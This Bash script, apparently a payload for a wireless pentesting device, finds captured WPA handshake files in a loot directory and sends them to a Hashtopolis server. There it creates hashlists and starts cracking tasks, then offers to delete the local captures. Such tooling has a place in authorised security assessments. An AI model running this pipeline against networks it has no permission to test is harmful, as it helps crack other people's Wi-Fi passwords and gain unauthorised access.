#!/bin/bash
# Title: Hashtopolis Handshake Upload
# Description: Manually uploads all captured handshakes to Hashtopolis server via API
# Author: Originaly Hunt-Z modified by TheDadNerd
# Version: 1.0
# Category: general
#
# Requirements:
# - Active internet connection
# - Valid Hashtopolis server with API access
# - Preconfigured task created in Hashtopolis
# - config.sh file in same directory with settings

# =============================================================================
# FALLBACK UI HELPERS (when not running under Pager)
# =============================================================================

type ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $*" >&2; }
type ALERT >/dev/null 2>&1 || ALERT() { echo "$*"; }
type LOG_INFO >/dev/null 2>&1 || LOG_INFO() { echo "$*"; }
type LOG_ERROR >/dev/null 2>&1 || LOG_ERROR() { echo "ERROR: $*" >&2; }
type CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() {
    local __prompt="$*"
    local __reply=""
    read -r -p "$__prompt [y/N]: " __reply
    [[ "$__reply" =~ ^[Yy]$ ]]
}

# =============================================================================
# LOAD CONFIGURATION
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/config.sh"

if [[ ! -f "$CONFIG_FILE" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Configuration file not found. Please create config.sh file."
    exit 1
fi

source "$CONFIG_FILE"

# =============================================================================
# VALIDATE CONFIGURATION
# =============================================================================

if [[ "$HASHTOPOLIS_URL" == *"example.com"* ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Server URL not configured. Edit config.sh to set HASHTOPOLIS_URL."
    exit 1
fi

if [[ "$API_KEY" == "YOUR_API_KEY_HERE" ]] || [[ -z "$API_KEY" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - API key not configured. Edit config.sh to set API_KEY."
    exit 1
fi

if [[ -z "$PRETASK_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Pretask ID not configured. Edit config.sh to set PRETASK_ID."
    exit 1
fi

if [[ -z "$CRACKER_VERSION_ID" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cracker Version ID not configured. Edit config.sh to set CRACKER_VERSION_ID."
    exit 1
fi

# =============================================================================
# TEST SERVER CONNECTION
# =============================================================================

CONNECTION_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d '{"section":"test","request":"connection"}' 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot connect to server. Check URL and internet connection."
    exit 1
fi

if ! echo "$CONNECTION_TEST" | jq -e '.response == "SUCCESS"' >/dev/null 2>&1; then
    ERROR_DIALOG "Hashtopolis Upload - Invalid API endpoint. Check HASHTOPOLIS_URL in config.sh."
    exit 1
fi

# =============================================================================
# TEST API KEY AUTHENTICATION
# =============================================================================

AUTH_TEST=$(curl -s -m 10 -X POST "$HASHTOPOLIS_URL" \
    -H "Content-Type: application/json" \
    -d "{\"section\":\"test\",\"request\":\"access\",\"accessKey\":\"$API_KEY\"}" 2>&1)

if [[ $? -ne 0 ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Cannot authenticate. Check network connection."
    exit 1
fi

if ! echo "$AUTH_TEST" | jq -e '.response == "OK"' >/dev/null 2>&1; then
    AUTH_ERROR=$(echo "$AUTH_TEST" | jq -r '.message // "Invalid API key"')
    ERROR_DIALOG "Hashtopolis Upload - Invalid API key. Error: $AUTH_ERROR. Generate key in Users > API Management."
    exit 1
fi

# =============================================================================
# PROCESS ALL HANDSHAKES IN DIRECTORY
# =============================================================================

HANDSHAKE_DIR="${1:-/root/loot/handshakes}"

if [[ ! -d "$HANDSHAKE_DIR" ]]; then
    ERROR_DIALOG "Hashtopolis Upload - Handshake directory not found: $HANDSHAKE_DIR"
    exit 1
fi

process_handshake_file() {
    local hashcat_path="$1"
    local base="${hashcat_path%.*}"
    local pcap_path=""
    local ssid=""
    local ap_mac="UNKNOWN_AP"
    local timestamp=""
    local unique_name=""
    local file_data=""
    local upload_json=""
    local upload_response=""
    local hashlist_id=""
    local task_json=""
    local task_response=""

    if [[ -f "${base}.pcap" ]]; then
        pcap_path="${base}.pcap"
    elif [[ -f "${base}.cap" ]]; then
        pcap_path="${base}.cap"
    fi

    if [[ -n "$pcap_path" ]]; then
        ssid=$(tcpdump -r "$pcap_path" -e -I -s 256 2>/dev/null \
          | sed -n 's/.*Beacon (\([^)]*\)).*/\1/p' \
          | head -n 1)
    fi

    if [[ -z "$ssid" ]]; then
        ssid="UNKNOWN_SSID"
    fi

    ssid=$(echo "$ssid" | tr -dc 'a-zA-Z0-9_-')

    timestamp=$(date +%s)
    unique_name="WPA_${ssid}_${ap_mac}_${timestamp}"

    file_data=$(base64 -w 0 "$hashcat_path" 2>&1)
    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - File encoding error for $hashcat_path"
        return 1
    fi

    upload_json=$(cat <<EOF
{
  "section": "hashlist",
  "request": "createHashlist",
  "name": "$unique_name",
  "isSalted": false,
  "isSecret": $SECRET_HASHLIST,
  "isHexSalt": false,
  "separator": ":",
  "format": 0,
  "hashtypeId": $HASH_TYPE,
  "accessGroupId": $ACCESS_GROUP_ID,
  "data": "$file_data",
  "useBrain": $USE_BRAIN,
  "brainFeatures": $BRAIN_FEATURES,
  "accessKey": "$API_KEY"
}
EOF
)

    upload_response=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
        -H "Content-Type: application/json" \
        -d "$upload_json" 2>&1)

    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - Cannot reach server for $hashcat_path"
        return 1
    fi

    if echo "$upload_response" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$upload_response" | jq -r '.message // "Unknown error"')
        if echo "$error_msg" | grep -qi "brain"; then
            LOG_ERROR "Hashtopolis Upload - Hashcat Brain Error for $hashcat_path: $error_msg"
        else
            LOG_ERROR "Hashtopolis Upload - API Error for $hashcat_path: $error_msg"
        fi
        return 1
    fi

    hashlist_id=$(echo "$upload_response" | jq -r '.hashlistId // empty')
    if [[ -z "$hashlist_id" ]]; then
        LOG_ERROR "Hashtopolis Upload - Hashlist ID not returned for $hashcat_path"
        return 1
    fi

    task_json=$(cat <<EOF
{
  "section": "task",
  "request": "runPretask",
  "name": "$unique_name",
  "hashlistId": $hashlist_id,
  "pretaskId": $PRETASK_ID,
  "crackerVersionId": $CRACKER_VERSION_ID,
  "accessKey": "$API_KEY"
}
EOF
)

    task_response=$(curl -s -m 30 -X POST "$HASHTOPOLIS_URL" \
        -H "Content-Type: application/json" \
        -d "$task_json" 2>&1)

    if [[ $? -ne 0 ]]; then
        LOG_ERROR "Hashtopolis Upload - Task creation timeout for $hashcat_path (hashlist ID: $hashlist_id)"
        return 1
    fi

    if echo "$task_response" | jq -e '.response == "ERROR"' >/dev/null 2>&1; then
        local error_msg
        error_msg=$(echo "$task_response" | jq -r '.message // "Unknown error"')
        LOG_ERROR "Hashtopolis Upload - Task Error for $hashcat_path: $error_msg (hashlist ID: $hashlist_id)"
        return 1
    fi

    LOG_INFO "Hashtopolis Upload - SUCCESS: $hashcat_path -> Hashlist ID: $hashlist_id"
    return 0
}

found_any=false
success_count=0
error_count=0

while IFS= read -r -d '' hashcat_file; do
    found_any=true
    if process_handshake_file "$hashcat_file"; then
        success_count=$((success_count + 1))
    else
        error_count=$((error_count + 1))
    fi
done < <(find "$HANDSHAKE_DIR" -type f -name '*.22000' -print0)

if [[ "$found_any" == false ]]; then
    ERROR_DIALOG "Hashtopolis Upload - No .22000 files found in $HANDSHAKE_DIR"
    exit 1
fi

if [[ "$error_count" -eq 0 ]]; then
    if CONFIRMATION_DIALOG "Remove local handshake files in $HANDSHAKE_DIR?"; then
        # All uploads succeeded, clean out the loot directory files.
        find "$HANDSHAKE_DIR" -type f -print0 | xargs -0 rm -f
        LOG_INFO "Hashtopolis Upload - Cleaned up files in $HANDSHAKE_DIR"
    else
        LOG_INFO "Hashtopolis Upload - Cleanup skipped by user."
    fi
fi

ALERT "Hashtopolis Upload - Completed. Success: $success_count, Errors: $error_count"
exit 0
